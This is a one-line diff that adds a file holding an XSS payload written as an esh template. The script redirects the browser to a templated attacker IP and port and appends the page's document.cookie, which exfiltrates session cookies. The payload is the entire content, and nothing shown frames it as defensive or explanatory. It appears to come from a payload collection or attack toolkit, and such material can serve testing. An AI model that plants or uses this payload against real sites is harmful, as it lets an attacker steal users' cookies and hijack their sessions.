@@ -1,0 +1,1 @@
+<script type="text/javascript">document.location="http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/?c="+document.cookie;</script>
